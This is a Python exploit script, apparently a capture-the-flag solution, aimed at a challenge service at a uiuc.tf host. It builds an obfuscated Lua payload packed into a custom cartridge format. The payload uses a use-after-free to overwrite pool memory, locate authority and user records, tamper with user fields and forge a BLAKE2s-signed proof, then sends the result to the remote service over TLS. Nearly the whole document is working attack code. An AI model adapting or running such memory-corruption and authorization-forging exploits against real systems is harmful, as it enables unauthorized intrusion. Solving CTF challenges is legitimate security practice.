#!/usr/bin/env python3
from pathlib import Path
import socket
import ssl
import subprocess
import sys

BASE_DIR = Path(__file__).resolve().parent
JS_PATH = BASE_DIR / "sparxicle.js"

def log_info(msg):
    print(f"[*] {msg}", file=sys.stderr)

def log_warn(msg):
    print(f"[!] {msg}", file=sys.stderr)

def log_error(msg):
    raise SystemExit(f"[-] {msg}")

MASK = 0xFFFFFFFF
NONCE = 0x051A7C1E
DEFAULT_HOST = "sparxie-vanishing-encore.chal.uiuc.tf"
DEFAULT_PORT = 1337


def mix(value: int) -> int:
    value &= MASK
    value ^= value >> 16
    value = (value * 0x7FEB352D) & MASK
    value ^= value >> 15
    value = (value * 0x846CA68B) & MASK
    return (value ^ (value >> 16)) & MASK


def pack_lua(source: bytes, nonce: int = NONCE) -> bytes:
    states = [
        mix(nonce ^ 0x243F6A88),
        mix(nonce ^ 0x85A308D3),
        mix(nonce ^ 0x13198A2E),
        mix(nonce ^ 0x03707344),
    ]

    enc = bytearray(len(source))
    for i, b in enumerate(source):
        lane = (i + (nonce & 3)) & 3
        states[lane] = mix(states[lane] + 0x9E3779B9 + i)
        key = (states[lane] >> ((i & 3) * 8)) & 0xFF
        enc[i] = b ^ key ^ ((i * 29) & 0xFF)

    checksum = nonce ^ 0x53505849
    for i, b in enumerate(source):
        checksum ^= b
        checksum = (((checksum << 5) | (checksum >> 27)) & MASK)
        checksum = (checksum * 0x045D9F3B + i) & MASK
    checksum = mix(checksum ^ len(source))

    header = b"SPX2LIVE" + len(source).to_bytes(4, 'little') + nonce.to_bytes(4, 'little')
    header += checksum.to_bytes(4, 'little')
    header += mix(nonce ^ len(source) ^ 0xA11CE5ED).to_bytes(4, 'little')
    header += (4).to_bytes(4, 'little')
    header += mix(checksum ^ nonce ^ 0xE1A7104E).to_bytes(4, 'little')
    return header + bytes(enc)


LUA = r'''
collectgarbage("stop")
local pass = "\x53\x50\x58\x50\x41\x53\x53\x21\x2b\xa1\x97\x4d\x1c\x00\x00\x00\x27\x05\xb9\x89\x3a\xfa\xb0\xed\x0c\x00\x00\x00\xa2\x05\x85\xc3\x9b\x72\x08\xe1\x35\xa4\xc6\x1f\x90\x2d\x77\xb8\xa9\xc4\x13\x6b\x2f\x00\x00\x00\x6f\x0b\xd4\x72\x9e\xc8\x31\x5a\xc4\xda\xb9\xe2\x7f\x93\xba\x5c\x9f\xf1\x43\x22\x30\xdc\xfb\x68\x71\xf3\x3b\x31\x89\x60\x65\xf7\xaa\xf4\x35\xc4\x42\x25\xcd\x98"

local M=0xffffffff
local IV={0x6A09E667,0xBB67AE85,0x3C6EF372,0xA54FF53A,0x510E527F,0x9B05688C,0x1F83D9AB,0x5BE0CD19}
local S={{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3},{11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4},{7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8},{9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13},{2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9},{12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11},{13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10},{6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5},{10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0}}
local function add(a,b,c) return ((a+b+(c or 0)) & M) end
local function ror(x,n) return (((x>>n)|(x<<(32-n))) & M) end
local function load32(s,i) local a,b,c,d=s:byte(i,i+3); return (a|(b<<8)|(c<<16)|(d<<24)) & M end
local function store32(x) return string.char(x&255,(x>>8)&255,(x>>16)&255,(x>>24)&255) end
local function G(v,a,b,c,d,x,y)
  v[a]=add(v[a],v[b],x); v[d]=ror(v[d]~v[a],16); v[c]=add(v[c],v[d]); v[b]=ror(v[b]~v[c],12)
  v[a]=add(v[a],v[b],y); v[d]=ror(v[d]~v[a],8); v[c]=add(v[c],v[d]); v[b]=ror(v[b]~v[c],7)
end
local function blake2s(msg)
  local h={}; for i=1,8 do h[i]=IV[i] end; h[1]=(h[1]~0x01010020)&M
  local function compress(block,t,last)
    local m={}; for i=0,15 do m[i+1]=load32(block,1+i*4) end
    local v={}; for i=1,8 do v[i]=h[i]; v[i+8]=IV[i] end
    v[13]=(v[13]~(t&M))&M; v[14]=(v[14]~((t>>32)&M))&M; if last then v[15]=(v[15]~M)&M end
    for r=1,10 do local s=S[r]
      G(v,1,5,9,13,m[s[1]+1],m[s[2]+1]); G(v,2,6,10,14,m[s[3]+1],m[s[4]+1]); G(v,3,7,11,15,m[s[5]+1],m[s[6]+1]); G(v,4,8,12,16,m[s[7]+1],m[s[8]+1])
      G(v,1,6,11,16,m[s[9]+1],m[s[10]+1]); G(v,2,7,12,13,m[s[11]+1],m[s[12]+1]); G(v,3,8,9,14,m[s[13]+1],m[s[14]+1]); G(v,4,5,10,15,m[s[15]+1],m[s[16]+1])
    end
    for i=1,8 do h[i]=(h[i]~v[i]~v[i+8])&M end
  end
  local off,rem,t=1,#msg,0
  while rem>64 do t=t+64; compress(msg:sub(off,off+63),t,false); off=off+64; rem=rem-64 end
  compress(msg:sub(off)..string.rep('\0',64-rem),t+rem,true)
  local out={}; for i=1,8 do out[i]=store32(h[i]) end; return table.concat(out)
end

local permit=sparxie.review(pass)
local s=sparxie.studio()
local c1=s:clip(0,4096)
local c2=s:clip(0,4096)
local tl=sparxie.timeline({c1,c2})
s:render(tl,permit)

local d=sparxie.draft()
local q=sparxie.queue(d)

-- stale clip UAF: make all queue lens entries cover the draft/authority pool
local qpatch="\xa0\xee\x01\x00\x00\x40\x00\x00"
for i=0,62 do
  local off=i*64+16
  c1:write(off,qpatch)
  c2:write(off,qpatch)
end

local l=q:lens()
local auth,user=nil,nil
local AUTH="\xa3\xc7\x51\x9e\xff\xff\x01\x00"
local USER="\xf2\xa6\xd8\x31\xff\xff\x01\x00"
for off=0,16000,272 do
  local m=l:read(off+260,8)
  if m==AUTH then auth=off end
  if m==USER then user=off end
end
if not auth or not user then error('pool scan failed') end

local campaign="\x6f\x0b\xd4\x72\x9e\xc8\x31\x5a"
local op="\xc1\x25\x4e\xb7"
l:write(user+96,campaign..op)

local seal="\xc4\xda\xb9\xe2\x7f\x93\xba\x5c\x9f\xf1\x43\x22\x30\xdc\xfb\x68\x71\xf3\x3b\x31\x89\x60\x65\xf7\xaa\xf4\x35\xc4\x42\x25\xcd\x98"
local msg="SPARXIE::ENCORE::PROOF"..l:read(auth,32)..l:read(user,32)..l:read(user+32,32)..seal..campaign..op..l:read(user+108,4)
l:write(user+64,blake2s(msg))

d:publish()
'''.encode()


def build_payload() -> bytes:
    return pack_lua(LUA)



def parse_kv_args(argv):
    flags = set()
    kv = {}
    for item in argv[1:]:
        if "=" in item:
            k, v = item.split("=", 1)
            kv[k.upper()] = v
        else:
            flags.add(item.upper())
    return flags, kv


def run_remote(payload: bytes, host: str, port: int) -> bytes:
    log_info(f"connecting to {host}:{port} over TLS (ALPN http/1.1)")
    raw = socket.create_connection((host, port), timeout=10)
    ctx = ssl.create_default_context()
    # The challenge frontend mishandles the connection when ALPN is absent
    # (or when HTTP/2 is selected), and returns nested TLS records as output.
    ctx.set_alpn_protocols(["http/1.1"])
    with ctx.wrap_socket(raw, server_hostname=host) as s:
        s.settimeout(10)
        prompt = b""
        while b"upload one SPX2 creator cartridge:" not in prompt:
            chunk = s.recv(4096)
            if not chunk:
                break
            prompt += chunk
        s.sendall(payload)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def run_local(payload: bytes, gdb_requested: bool = False) -> bytes:
    if not JS_PATH.exists():
        log_error(f"local mode needs {JS_PATH}")
    if gdb_requested:
        log_warn("GDB mode is not useful for this JS/WASM build; running local node process")
    log_info("running local node process")
    p = subprocess.Popen(
        ["node", str(JS_PATH)],
        cwd=str(BASE_DIR),
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = p.communicate(payload, timeout=15)
    return out


def main():
    flags, kv = parse_kv_args(sys.argv)
    payload = build_payload()
    log_info(f"cartridge size: {len(payload)} bytes")

    if "REMOTE" in flags:
        host = kv.get("HOST", DEFAULT_HOST)
        port = int(kv.get("PORT", str(DEFAULT_PORT)))
        out = run_remote(payload, host, port)
    else:
        out = run_local(payload, "GDB" in flags)

    sys.stdout.buffer.write(out)


if __name__ == "__main__":
    main()
